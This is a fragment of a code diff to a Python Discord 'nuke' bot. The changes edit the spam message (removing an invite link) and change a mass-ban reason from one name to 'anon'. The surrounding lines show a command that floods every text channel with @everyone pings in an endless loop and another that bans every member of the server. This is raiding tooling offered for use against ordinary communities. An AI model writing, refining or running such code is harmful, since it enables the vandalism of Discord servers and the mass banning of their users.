@@ -169,7 +169,7 @@ async def nuke(ctx):
     for channel in ctx.guild.channels:
         if isinstance(channel, discord.TextChannel):
             while True:
-                await channel.send("@everyone SUN BOT>>>>>>> https://discord.gg/fastly")
+                await channel.send("@everyone SUN BOT>>>>>>>")
 
 @bot.command()
 async def scr(ctx):
@@ -248,7 +248,7 @@ async def swh(ctx):
 async def mb(ctx):
   try:
     for members in ctx.guild.members:
-      await members.ban(reason="Nuked By niko")
+      await members.ban(reason="Nuked By anon")
       print(Fore.GREEN + f"banned {members}")
   except:
     print(Fore.RED + f"cant ban {members}")
